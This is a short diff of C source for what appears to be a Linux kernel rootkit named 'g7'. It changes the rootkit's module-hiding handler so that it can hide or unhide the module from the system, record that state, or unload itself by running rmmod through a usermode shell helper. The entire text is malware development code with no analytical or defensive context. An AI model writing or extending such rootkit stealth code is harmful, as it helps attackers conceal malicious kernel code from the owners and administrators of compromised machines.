@@ -69,13 +69,10 @@ handle_modhide(unsigned long arg)
     long sarg = (long)arg;
 
     if (!sarg) {
-        char buf[BUFLEN];
-        sprintf(buf, "/sbin/rmmod %s", G7_DEVICE);
-
-        char *argv[] = {
+        static char *argv[] = {
             "/bin/sh",
             "-c",
-            buf,
+            "/sbin/rmmod g7",
             NULL
         };
 
@@ -91,9 +88,13 @@ handle_modhide(unsigned long arg)
         call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     } else if (sarg < 0) {
         unhide_module();
-        DEBUG_NOTICE("unhiding pid %ld\n", -sarg);
+        rootkit.hiding_module = 0;
+
+        DEBUG_NOTICE("modhide off\n");
     } else if (sarg > 0) {
         hide_module();
+        rootkit.hiding_module = 1;
+
         DEBUG_NOTICE("modhide on\n");
     }
 
